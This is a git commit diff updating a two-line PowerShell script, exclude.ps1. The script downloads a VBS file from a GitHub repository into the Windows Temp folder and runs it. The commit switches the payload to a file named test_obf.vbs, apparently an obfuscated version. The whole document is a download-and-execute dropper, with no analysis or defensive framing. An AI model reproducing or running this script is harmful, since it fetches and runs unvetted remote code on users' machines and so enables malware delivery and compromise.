c76699f43dfb4932402361744eed03d2354188d7
rude90 <115774095+rude90@users.noreply.github.com>
2023-12-23 20:40:23 +0500

    Update exclude.ps1

--- exclude.ps1
+++ exclude.ps1
@@ -1,2 +1,2 @@
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/rude90/VBS/raw/main/test.vbs", "C:\Windows\Temp\test.vbs")
-Start-Process "C:\Windows\Temp\test.vbs"
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/rude90/VBS/raw/main/test_obf.vbs", "C:\Windows\Temp\test_obf.vbs")
+Start-Process "C:\Windows\Temp\test_obf.vbs"
